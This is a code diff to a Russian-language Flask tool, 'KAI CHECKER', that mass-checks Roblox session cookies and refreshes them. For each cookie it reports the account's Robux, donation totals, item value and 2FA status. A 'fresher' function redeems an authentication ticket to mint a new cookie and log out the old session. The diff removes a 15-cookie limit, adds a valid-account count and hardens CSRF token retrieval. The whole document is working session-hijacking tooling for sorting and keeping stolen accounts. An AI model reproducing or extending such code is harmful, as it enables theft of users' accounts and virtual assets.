@@ -186,7 +186,7 @@ def format_short_report(info):
     r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
     r += f"💎 RAP: {'❌ Нет' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n\n"
-    r += "🛡️ БЕЗОПАСНОСТЬ:\n"
+    r += f"🛡️ БЕЗОПАСНОСТЬ:\n"
     r += f"   📧 Почта: {'✅' if info['EmailSet'] else '❌'}\n"
     r += f"   🔐 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
     r += f"   {info['SecurityStatus']}\n"
@@ -247,7 +247,7 @@ def generate_full_txt_report(info):
     return r
 
 # ============================================================
-# ФРЕШЕР
+# ФРЕШЕР (ИСПРАВЛЕННЫЙ)
 # ============================================================
 
 async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple:
@@ -267,24 +267,19 @@ async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple
     
     async with AsyncSession(impersonate="chrome120") as session:
         csrf_token = None
-        for _ in range(3):
+        for url in ["https://auth.roblox.com/v2/logout", "https://www.roblox.com/home"]:
             try:
-                r = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=10)
+                r = await session.post(url, headers=headers_base, timeout=10) if "logout" in url else await session.get(url, headers=headers_base, timeout=10)
                 csrf_token = r.headers.get("x-csrf-token")
+                if not csrf_token:
+                    match = re.search(r"setToken\('(.*?)'\)", r.text)
+                    if match:
+                        csrf_token = match.group(1)
                 if csrf_token:
                     break
             except:
                 pass
         
-        if not csrf_token:
-            try:
-                r = await session.get("https://www.roblox.com/home", headers=headers_base, timeout=10)
-                match = re.search(r"setToken\('(.*?)'\)", r.text)
-                if match:
-                    csrf_token = match.group(1)
-            except:
-                pass
-
         if not csrf_token:
             return False, None, "❌ CSRF не получен"
 
@@ -299,6 +294,7 @@ async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple
                     break
             except:
                 pass
+        
         if not ticket:
             return False, None, "❌ Ticket не получен"
 
@@ -306,7 +302,11 @@ async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple
         for _ in range(3):
             try:
                 r = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
-                                      headers={"User-Agent": "Roblox/WinInet", "RBXAuthenticationNegotiation": "1"}, 
+                                      headers={
+                                          "User-Agent": "Roblox/WinInet", 
+                                          "Referer": "https://www.roblox.com/",
+                                          "RBXAuthenticationNegotiation": "1"
+                                      }, 
                                       json={"authenticationTicket": ticket}, timeout=10)
                 set_cookie = r.headers.get("set-cookie", "")
                 if ".ROBLOSECURITY=" in set_cookie:
@@ -521,7 +521,7 @@ HTML = """<!DOCTYPE html>
     <div class="header">
         <div class="logo">KAI <span>CHECKER</span></div>
         <div style="display: flex; align-items: center; gap: 15px;">
-            <span style="color: #c084fc; font-weight: 700; font-size: 14px; background: rgba(168, 85, 247, 0.15); padding: 4px 12px; border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 20px;">ТЕСТ</span>
+            <span style="color: #c084fc; font-weight: 700; font-size: 14px; background: rgba(168, 85, 247, 0.15); padding: 4px 12px; border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 20px;">ПРОФФИ</span>
             <span id="sessionTimer" style="color: #00b894; font-family: 'Inter', monospace; font-weight: 600; font-size: 13px; background: rgba(0, 184, 148, 0.1); padding: 4px 10px; border-radius: 12px; border: 1px solid rgba(0, 184, 148, 0.2);">⏱️ 00:00:00</span>
             <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
         </div>
@@ -537,11 +537,11 @@ HTML = """<!DOCTYPE html>
     <!-- ===== ЧЕКЕР ===== -->
     <div class="tab-content active" id="tab-checker">
         <div class="card">
-            <h2>🔍 Проверка куков</h2>
+            <h2>🔍 Проверка куков (Массовая)</h2>
             <div style="display:flex; flex-wrap:wrap; gap:18px;">
                 <div style="flex:2;">
-                    <textarea id="manualCookies" placeholder="Вставь куки сюда (по одному или несколько) ..." rows="6"></textarea>
-                    <div style="margin-top:8px;color:#9880c0;font-size:13px;">или загрузи .txt файл</div>
+                    <textarea id="manualCookies" placeholder="Вставь куки сюда (каждый с новой строки) ..." rows="6"></textarea>
+                    <div style="margin-top:8px;color:#9880c0;font-size:13px;">или загрузи .txt файл с куками</div>
                 </div>
                 <div style="flex:1;">
                     <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
@@ -552,7 +552,7 @@ HTML = """<!DOCTYPE html>
                 </div>
             </div>
             <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
-                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить проверку</button>
+                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить массовую проверку</button>
                 <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
             </div>
             <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
@@ -617,7 +617,6 @@ HTML = """<!DOCTYPE html>
 </div>
 
 <script>
-    // Таймер запуска / сессии
     let startTime = Date.now();
     setInterval(() => {
         let diff = Math.floor((Date.now() - startTime) / 1000);
@@ -685,8 +684,8 @@ HTML = """<!DOCTYPE html>
         const formData = new FormData();
         formData.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');
 
-        resBox.textContent = '⏳ Проверка...';
-        progress.style.width = '30%';
+        resBox.textContent = '⏳ Массовая проверка аккаунтов запущена...';
+        progress.style.width = '40%';
         
         try {
             const response = await fetch('/api/fullcheck', { method: 'POST', body: formData });
@@ -701,12 +700,12 @@ HTML = """<!DOCTYPE html>
                     }
                 }
                 
-                let html = `✅ Всего добавлено в историю: ${checkerHistory.length}\\n\\n`;
+                let html = `✅ Проверено аккаунтов: ${data.total} | Успешно валидных: ${data.valid_count}\n\n`;
                 for (const report of checkerHistory) {
-                    html += `${report}\\n────────────────────────────────────────\\n`;
+                    html += `${report}\n────────────────────────────────────────\n`;
                 }
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank">Скачать ZIP с полными отчетами (.txt)</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="margin-top:10px; display:inline-block;">Скачать ZIP со всеми отчетами (.txt)</a>`;
                 }
                 resBox.innerHTML = html;
                 resBox.scrollTop = resBox.scrollHeight;
@@ -748,7 +747,7 @@ HTML = """<!DOCTYPE html>
         const resultWrapper = document.getElementById('freshResultWrapper');
         const resultCode = document.getElementById('freshResultCode');
         
-        const cookies = input.value.trim().split('\\n').filter(c => c.trim().length > 50);
+        const cookies = input.value.trim().split('\n').filter(c => c.trim().length > 50);
         if (!cookies.length) { status.textContent = '❌ Нет куков'; return; }
         
         if (freshRunning) return;
@@ -800,7 +799,7 @@ HTML = """<!DOCTYPE html>
         status.textContent = '✅ Готово';
         
         if (newCookies.length) {
-            resultCode.textContent = newCookies.join('\\n');
+            resultCode.textContent = newCookies.join('\n');
             resultWrapper.style.display = 'block';
         }
     }
@@ -844,7 +843,7 @@ def api_fullcheck():
     reports = []
     full_reports = []
     
-    for c in cookies[:15]:
+    for c in cookies:
         info = get_full_info(c)
         if info['status'] == '✅':
             reports.append(format_short_report(info))
@@ -865,6 +864,7 @@ def api_fullcheck():
     return jsonify({
         "success": True,
         "total": len(cookies),
+        "valid_count": len(reports),
         "reports": reports,
         "download_url": f"/downloads/{filename}"
     })
